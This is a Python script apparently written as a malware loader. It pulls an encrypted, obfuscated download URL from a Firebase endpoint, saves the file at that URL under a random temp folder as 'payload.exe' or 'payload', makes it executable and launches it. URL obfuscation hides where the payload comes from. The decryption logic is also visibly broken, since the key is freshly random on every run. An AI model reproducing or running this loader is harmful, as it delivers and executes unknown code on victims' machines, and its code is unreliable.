import requests
import json
import os
import subprocess
import time
import random
import string
import base64
import hashlib
from cryptography.fernet import Fernet

class FirebaseDownloader:
    def __init__(self, firebase_url):
        self.firebase_url = firebase_url
        self.session = requests.Session()
        self.encryption_key = self._generate_encryption_key()
        self.cipher_suite = Fernet(self.encryption_key)

    def _generate_encryption_key(self):
        return base64.urlsafe_b64encode(hashlib.sha256(os.urandom(32)).digest())

    def _encrypt_data(self, data):
        if isinstance(data, str):
            data = data.encode('utf-8')
        return self.cipher_suite.encrypt(data)

    def _decrypt_data(self, encrypted_data):
        return self.cipher_suite.decrypt(encrypted_data).decode('utf-8')

    def _generate_random_string(self, length=10):
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

    def _obfuscate_url(self, url):
        obfuscated = base64.b64encode(url.encode('utf-8')).decode('utf-8')
        return obfuscated[::-1] + self._generate_random_string()

    def _deobfuscate_url(self, obfuscated):
        actual = obfuscated[:-10][::-1]
        return base64.b64decode(actual).decode('utf-8')

    def fetch_payload_address(self):
        try:
            response = self.session.get(f"{self.firebase_url}/payload.json")
            response.raise_for_status()
            encrypted_data = response.json().get('download_url', '')
            if not encrypted_data:
                return None
            decrypted_url = self._decrypt_data(encrypted_data.encode('utf-8'))
            return self._deobfuscate_url(decrypted_url)
        except Exception as e:
            print(f"Error fetching payload address: {e}")
            return None

    def download_payload(self, url, save_path):
        try:
            response = self.session.get(url, stream=True)
            response.raise_for_status()
            with open(save_path, 'wb') as f:
                for chunk in response.iter_content(chunk_size=8192):
                    f.write(chunk)
            return True
        except Exception as e:
            print(f"Error downloading payload: {e}")
            return False

    def execute_payload(self, payload_path):
        try:
            if os.name == 'nt':
                subprocess.Popen([payload_path], shell=True)
            else:
                os.chmod(payload_path, 0o755)
                subprocess.Popen([payload_path])
            return True
        except Exception as e:
            print(f"Error executing payload: {e}")
            return False

    def run(self):
        payload_url = self.fetch_payload_address()
        if not payload_url:
            print("No payload URL found.")
            return

        temp_dir = os.path.join(os.getenv('TEMP', '/tmp'), self._generate_random_string())
        os.makedirs(temp_dir, exist_ok=True)
        payload_path = os.path.join(temp_dir, "payload.exe" if os.name == 'nt' else "payload")

        if self.download_payload(payload_url, payload_path):
            print("Payload downloaded successfully.")
            if self.execute_payload(payload_path):
                print("Payload executed successfully.")
            else:
                print("Failed to execute payload.")
        else:
            print("Failed to download payload.")

if __name__ == "__main__":
    firebase_url = "https://your-firebase-project.firebaseio.com"
    downloader = FirebaseDownloader(firebase_url)
    downloader.run()
